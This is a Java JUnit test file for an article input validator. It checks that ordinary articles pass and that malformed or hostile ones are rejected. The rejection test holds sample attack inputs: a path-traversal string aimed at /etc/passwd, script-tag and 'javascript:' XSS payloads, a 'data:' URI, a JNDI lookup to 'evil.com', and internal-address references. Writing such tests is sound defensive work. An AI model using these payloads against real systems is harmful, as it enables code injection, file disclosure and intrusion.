package com.reyesemf.gm.article.infrastructure;

import com.reyesemf.gm.article.domain.model.Article;
import com.reyesemf.gm.article.domain.model.Category;
import org.junit.jupiter.api.Test;

import java.util.function.Consumer;

import static org.junit.jupiter.api.Assertions.assertDoesNotThrow;
import static org.junit.jupiter.api.Assertions.assertThrows;

public class ArticleValidatorTest {
    private final Consumer<Article> articleValidator = new ArticleValidator();

    @Test
    public void givenValidArticleWhenAcceptThenDoesNotThrow() {
        assertDoesNotThrow(() -> articleValidator.accept(createValidArticle("Electronics", "Electronic gadgets", "https://example.com/electronics.jpg", "https://example.com/electronics")));
        assertDoesNotThrow(() -> articleValidator.accept(createValidArticle("Books", "Books literature", "https://cdn.example.com/books.png", "https://example.com/books")));
        assertDoesNotThrow(() -> articleValidator.accept(createValidArticle("Sports", "Sports equipment", "https://images.example.com/sports.jpg", "https://example.com/sports")));
        assertDoesNotThrow(() -> articleValidator.accept(createValidArticle("Fashion", "Clothing accessories", "https://assets.example.com/fashion.jpg", "https://example.com/fashion")));
        assertDoesNotThrow(() -> articleValidator.accept(createValidArticle("Music", "Musical instruments", "https://example.com/music.jpg", "https://example.com/music")));
        assertDoesNotThrow(() -> articleValidator.accept(createValidArticle("Games", "Video games toys", "https://example.com/games.jpg", "https://example.com/games")));
        assertDoesNotThrow(() -> articleValidator.accept(createValidArticle("Food", "Food beverages", "https://example.com/food.jpg", "https://example.com/food")));
        assertDoesNotThrow(() -> articleValidator.accept(createValidArticle("Automotive", "Car parts accessories", "https://example.com/auto.jpg", "https://example.com/automotive")));
        assertDoesNotThrow(() -> articleValidator.accept(createValidArticle("Beauty", "Beauty cosmetics", "https://example.com/health.jpg", "https://example.com/health")));
        assertDoesNotThrow(() -> articleValidator.accept(createValidArticle("Pets", "Pet supplies accessories", "https://example.com/pets.jpg", "https://example.com/pets")));
        assertDoesNotThrow(() -> articleValidator.accept(createValidArticle("Arts", "Arts crafts supplies", "https://example.com/art.jpg", "https://example.com/art")));
        assertDoesNotThrow(() -> articleValidator.accept(createValidArticle("Travel", "Travel accessories", "https://example.com/travel.jpg", "https://example.com/travel")));
    }
    
    @Test
    public void givenInvalidArticleWhenAcceptThenThrowsIllegalArgumentException() {
        assertThrows(IllegalArgumentException.class, () -> articleValidator.accept(createInvalidArticle("localhost", "Local server article", "https://example.com/image.jpg", "https://example.com/local")));
        assertThrows(IllegalArgumentException.class, () -> articleValidator.accept(createInvalidArticle("Sports News", "Connect to 127.0.0.1 for data", "https://example.com/sports.jpg", "https://example.com/sports")));
        assertThrows(IllegalArgumentException.class, () -> articleValidator.accept(createInvalidArticle("Tech Update", "Visit http://internal.server", "https://example.com/tech.jpg", "https://example.com/tech")));
        assertThrows(IllegalArgumentException.class, () -> articleValidator.accept(createInvalidArticle("admin", "Admin article", "https://example.com/admin.jpg", "https://example.com/admin")));
        assertThrows(IllegalArgumentException.class, () -> articleValidator.accept(createInvalidArticle("test", "Test article", "https://example.com/test.jpg", "https://example.com/test")));
        assertThrows(IllegalArgumentException.class, () -> articleValidator.accept(createInvalidArticle("News Update", "../../../etc/passwd", "https://example.com/news.jpg", "https://example.com/news")));
        assertThrows(IllegalArgumentException.class, () -> articleValidator.accept(createInvalidArticle("Book News", "Books with http://192.168.1.1", "https://example.com/books.jpg", "https://example.com/books")));
        assertThrows(IllegalArgumentException.class, () -> articleValidator.accept(createInvalidArticle("Home Guide", "Home tips with localhost reference", "https://example.com/home.jpg", "https://example.com/home")));
        assertThrows(IllegalArgumentException.class, () -> articleValidator.accept(createInvalidArticle("Fashion News", "<script>alert('xss')</script>", "https://example.com/fashion.jpg", "https://example.com/fashion")));
        assertThrows(IllegalArgumentException.class, () -> articleValidator.accept(createInvalidArticle("Health Tips", "${jndi:ldap://evil.com}", "https://example.com/health.jpg", "https://example.com/health")));
        assertThrows(IllegalArgumentException.class, () -> articleValidator.accept(createInvalidArticle("Gaming Guide", "Gaming products", "javascript:alert(1)", "https://example.com/games")));
        assertThrows(IllegalArgumentException.class, () -> articleValidator.accept(createInvalidArticle("Food Guide", "Food items", "https://example.com/food.jpg", "data:text/html,<script>")));
        assertThrows(IllegalArgumentException.class, () -> articleValidator.accept(createInvalidArticle("Auto News", "Automotive", "not-a-url", "https://example.com/auto")));
        assertThrows(IllegalArgumentException.class, () -> articleValidator.accept(createInvalidArticle("Health News", "Health products", "https://example.com/health.jpg", "example.com")));
        assertThrows(IllegalArgumentException.class, () -> articleValidator.accept(createInvalidArticle("Pet Guide", "Pet supplies", "", "https://example.com/pets")));
        assertThrows(IllegalArgumentException.class, () -> articleValidator.accept(createInvalidArticle("Art News", "Art supplies", "https://example.com/art.jpg", "")));
    }

    @Test
    public void givenNullArticleWhenAcceptThenThrowsNullPointerException() {
        assertThrows(NullPointerException.class, () -> articleValidator.accept(null));
        assertThrows(NullPointerException.class, () -> articleValidator.accept(createArticleWithNullName()));
        assertThrows(NullPointerException.class, () -> articleValidator.accept(createArticleWithNullDescription()));
        assertThrows(NullPointerException.class, () -> articleValidator.accept(createArticleWithNullImage()));
        assertThrows(NullPointerException.class, () -> articleValidator.accept(createArticleWithNullUrl()));
        assertThrows(NullPointerException.class, () -> articleValidator.accept(createArticleWithNullCategory()));
    }

    private Article createValidArticle(String name, String description, String image, String url) {
        Article article = new Article();
        article.setName(name);
        article.setDescription(description);
        article.setImage(image);
        article.setUrl(url);
        article.setCategory(createValidCategory());
        return article;
    }

    private Article createInvalidArticle(String name, String description, String image, String url) {
        Article article = new Article();
        article.setName(name);
        article.setDescription(description);
        article.setImage(image);
        article.setUrl(url);
        article.setCategory(createValidCategory());
        return article;
    }

    private Article createArticleWithNullName() {
        Article article = new Article();
        article.setName(null);
        article.setDescription("Valid description");
        article.setImage("https://example.com/image.jpg");
        article.setUrl("https://example.com/url");
        article.setCategory(createValidCategory());
        return article;
    }

    private Article createArticleWithNullDescription() {
        Article article = new Article();
        article.setName("Valid Name");
        article.setDescription(null);
        article.setImage("https://example.com/image.jpg");
        article.setUrl("https://example.com/url");
        article.setCategory(createValidCategory());
        return article;
    }

    private Article createArticleWithNullImage() {
        Article article = new Article();
        article.setName("Valid Name");
        article.setDescription("Valid description");
        article.setImage(null);
        article.setUrl("https://example.com/url");
        article.setCategory(createValidCategory());
        return article;
    }

    private Article createArticleWithNullUrl() {
        Article article = new Article();
        article.setName("Valid Name");
        article.setDescription("Valid description");
        article.setImage("https://example.com/image.jpg");
        article.setUrl(null);
        article.setCategory(createValidCategory());
        return article;
    }

    private Article createArticleWithNullCategory() {
        Article article = new Article();
        article.setName("Valid Name");
        article.setDescription("Valid description");
        article.setImage("https://example.com/image.jpg");
        article.setUrl("https://example.com/url");
        article.setCategory(null);
        return article;
    }

    private Category createValidCategory() {
        Category category = new Category();
        category.setName("Technology");
        category.setSlug("technology");
        category.setDescription("Technology articles");
        category.setImage("https://example.com/tech.jpg");
        category.setUrl("https://example.com/technology");
        return category;
    }
}